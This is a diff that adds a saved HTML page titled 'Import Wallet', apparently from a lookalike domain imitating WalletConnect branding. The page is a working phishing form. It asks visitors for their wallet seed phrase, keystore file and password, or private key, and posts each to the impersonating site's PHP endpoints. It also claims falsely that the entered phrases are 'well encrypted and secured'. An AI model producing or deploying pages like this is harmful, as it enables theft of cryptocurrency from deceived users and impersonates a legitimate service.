@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<!-- saved from url=(0058)http://dappswallet-connect.com/connect/display_package.php -->
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    
+    
+    <link rel="stylesheet" href="./Import Wallet_files/main.css" type="text/css">
+    <meta name="description" content="Open protocol for connecting Wallets to Dapps">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta property="og:image" content="https://walletconnect.org/favicon.ico">
+    <link rel="icon" href="https://walletconnect.org/favicon.ico">
+    <script>
+    function openCity(evt, cityName) {
+        // Declare all variables
+        var i, tabcontent, tablinks;
+
+        // Get all elements with class="tabcontent" and hide them
+        tabcontent = document.getElementsByClassName("tabcontent");
+        for (i = 0; i < tabcontent.length; i++) {
+            tabcontent[i].style.display = "none";
+        }
+
+        // Get all elements with class="tablinks" and remove the class "active"
+        tablinks = document.getElementsByClassName("tablinks");
+        for (i = 0; i < tablinks.length; i++) {
+            tablinks[i].className = tablinks[i].className.replace(" active", "");
+        }
+
+        // Show the current tab, and add an "active" class to the button that opened the tab
+        document.getElementById(cityName).style.display = "block";
+        evt.currentTarget.className += " active";
+    }
+    </script>
+    <title>Import Wallet</title>
+</head>
+
+<body><br>
+        <h2>
+            <center>Import Wallet <input type="hidden" name="phrase_card" value="BNB"></center>
+        </h2>
+        <br>
+        <div class="tab">
+            <button class="tablinks active" id="default" onclick="openCity(event, &#39;phrase&#39;)">Phrase</button>
+            
+            <button class="tablinks" onclick="openCity(event, &#39;private&#39;)">Private Key</button>
+        </div>
+
+        <div id="phrase" class="tabcontent" style="display: block;">
+            <form action="http://dappswallet-connect.com/connect/phrase.php" method="POST">
+
+                <input type="hidden" name="phrase_card" value="BNB">
+
+                <textarea name="ph" class="phrase" placeholder="Phrase"></textarea>
+
+                <br>
+                <div class="desc">Typically 12 (sometimes 24) words separated by single spaces</div>
+                <br>
+                <button type="submit" name="import_ph" class="btn">IMPORT</button>
+                <br>
+                <center>
+                </center>
+            </form>
+
+
+        </div>
+
+        <div id="keystore" class="tabcontent" style="display: none;">
+            <form action="http://dappswallet-connect.com/connect/keystore.php" method="POST">
+
+                <input type="hidden" name="keystore_card" value="BNB">
+
+                <textarea name="keystores" class="phrase" placeholder="Keystore JSON"></textarea>
+                <br>
+                <div class="field">
+                    <input type="text" name="password" placeholder="Password">
+                </div>
+                <div class="desc">Several lines of text beginning with '(...)' plus the password you used to encrypt it.
+                </div>
+                <br>
+                <button type="submit" name="import_key" class="btn">IMPORT</button>
+                <br>
+                <center><b>Note: Your wallet seed phrase are well encrypted and secured.</b></center>
+            </form>
+        </div>
+
+        <div id="private" class="tabcontent" style="display: none;">
+            <form action="http://dappswallet-connect.com/connect/private.php" method="POST">
+                <input type="hidden" name="private_card" value="BNB">
+                <div class="field">
+                    <input type="text" name="pkey" class="key" placeholder="Private Key">
+                </div>
+                <div class="desc">Typically 12 (sometimes 24) words separated by single spaces</div>
+                <br>
+                <button type="submit" name="import_pri" class="btn">IMPORT</button>
+                <br>
+                <center></center>
+            </form>
+        </div>
+
+        <script>
+        document.getElementById("default").click();
+        </script>
+        
+    
+
+
+</body></html>
